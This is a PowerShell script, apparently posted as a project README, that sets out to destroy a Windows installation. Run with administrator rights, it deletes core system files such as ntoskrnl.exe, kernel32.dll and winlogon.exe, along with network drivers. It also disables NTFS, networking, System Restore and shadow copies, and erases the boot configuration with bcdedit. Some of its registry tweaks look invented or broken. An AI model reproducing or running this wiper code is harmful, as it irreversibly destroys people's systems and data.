# Destruction-of-Windows
Windows Complete Destruction
# Extreme Destruction of Windows Script - USE AT YOUR OWN RISK
# This script will make the system unbootable or render it unusable.

# Ensure script is run as Administrator
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "You need to run this script as an administrator!" -ForegroundColor Red
    exit
}

# PART 1: Remove Windows UI and Shell Functionality

Write-Host "Disabling Windows Shell (Explorer)..." -ForegroundColor Red
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "cmd.exe" -Force
# Alternatively, blank shell for no shell at all
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "" -Force

Write-Host "Deleting Explorer.exe and dwm.exe..." -ForegroundColor Red
Remove-Item -Path "C:\Windows\explorer.exe" -Force
Remove-Item -Path "C:\Windows\System32\dwm.exe" -Force

Write-Host "Disabling Taskbar and System Tray..." -ForegroundColor Red
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoTrayItemsDisplay" -Value 1 -Force

# PART 2: Remove Networking Functionality Completely

Write-Host "Disabling TCP/IP Stack and Networking..." -ForegroundColor Red
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "EnableTCP" -Value 0 -Force

Write-Host "Deleting Core Network Drivers..." -ForegroundColor Red
Remove-Item -Path "C:\Windows\System32\drivers\tcpip.sys" -Force
Remove-Item -Path "C:\Windows\System32\drivers\ndis.sys" -Force

Write-Host "Disabling DHCP, DNS, and NetBIOS services..." -ForegroundColor Red
Set-Service -Name Dhcp -StartupType Disabled
Set-Service -Name Dnscache -StartupType Disabled
Set-Service -Name NetBT -StartupType Disabled
Set-Service -Name LanmanWorkstation -StartupType Disabled
Set-Service -Name LanmanServer -StartupType Disabled
Stop-Service -Name Dhcp, Dnscache, NetBT, LanmanWorkstation, LanmanServer -Force

# PART 3: Attack the Kernel - Disable Kernel-Level Protections

Write-Host "Disabling Kernel Patch Protection and Secure Boot..." -ForegroundColor Red
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "DisableKernelPatchProtection" -Value 1 -Force
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\State" -Name "UEFISecureBootEnabled" -Value 0 -Force

Write-Host "Disabling CPU Scheduler and Thread Management..." -ForegroundColor Red
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Scheduler" -Name "Start" -Value 4 -Force

Write-Host "Deleting Critical Kernel Files (ntoskrnl.exe)..." -ForegroundColor Red
Remove-Item -Path "C:\Windows\System32\ntoskrnl.exe" -Force

# PART 4: Destroy Core Services - Task Scheduler, WMI, and System Restore

Write-Host "Disabling Task Scheduler completely..." -ForegroundColor Red
Set-Service -Name Schedule -StartupType Disabled
Stop-Service -Name Schedule -Force

Write-Host "Disabling WMI (Windows Management Instrumentation)..." -ForegroundColor Red
Set-Service -Name Winmgmt -StartupType Disabled
Stop-Service -Name Winmgmt -Force

Write-Host "Disabling System Restore and Volume Shadow Copy..." -ForegroundColor Red
Disable-ComputerRestore -Drive "C:\" 
Set-Service -Name VSS -StartupType Disabled
Stop-Service -Name VSS -Force

# PART 5: Remove File System Components and Disk I/O

Write-Host "Disabling NTFS File System..." -ForegroundColor Red
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Ntfs" -Name "Start" -Value 4 -Force

Write-Host "Disabling Volume Snapshots (VSS)..." -ForegroundColor Red
Remove-Item -Path "C:\Windows\System32\drivers\volsnap.sys" -Force

Write-Host "Deleting Paging File (Virtual Memory) and disabling Disk I/O..." -ForegroundColor Red
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "PagingFiles" -Value "" -Force

# PART 6: Break Windows Boot Process and Integrity Checks

Write-Host "Deleting Boot Configuration Data (BCD)..." -ForegroundColor Red
bcdedit /delete {bootmgr} /f

Write-Host "Disabling Secure Boot Integrity Checks..." -ForegroundColor Red
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "DisableIntegrityChecks" -Value 1 -Force

# PART 7: Final Destruction - Remove Critical Libraries and Services

Write-Host "Deleting Critical System Libraries (kernel32.dll, winlogon.exe)..." -ForegroundColor Red
Remove-Item -Path "C:\Windows\System32\kernel32.dll" -Force
Remove-Item -Path "C:\Windows\System32\winlogon.exe" -Force

# PART 8: Power Management and HAL Destruction

Write-Host "Disabling Power Management and HAL (Hardware Abstraction Layer)..." -ForegroundColor Red
Set-Service -Name ACPI -StartupType Disabled
Set-ItemProperty -Path "HKLM\SYSTEM\CurrentControlSet\Services\hal" -Name "Start" -Value 4 -Force

Write-Host "All critical destruction steps are complete. Your system is now irreversibly broken. Rebooting will likely result in complete failure to boot." -ForegroundColor Green
